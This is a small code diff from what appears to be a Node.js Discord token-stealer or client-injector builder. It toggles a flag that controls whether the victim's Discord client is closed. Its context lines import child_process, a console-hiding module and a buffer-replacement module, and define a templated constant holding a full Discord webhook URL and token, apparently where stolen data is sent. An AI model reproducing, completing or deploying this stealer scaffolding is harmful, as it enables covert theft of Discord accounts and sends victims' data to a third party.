@@ -13,7 +13,7 @@ const { execSync, exec } = require('child_process');
 const hideconsole = require('node-hide-console-window');
 const buf_replace = require('buffer-replace');
 
-let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
+let killdcop = false; // if u want to close discord make this "true" if u dont want to close discord make this "false";
 
 
 const %webhookstring% = "https://discord.com/api/webhooks/1487503420796571820/dVQUILLlMIZn8xZ2ycW0VtqK_W6INtiYsxc4ukIU1EZwMqf3Sp6Js5MWg8pjRe4iY2T6"
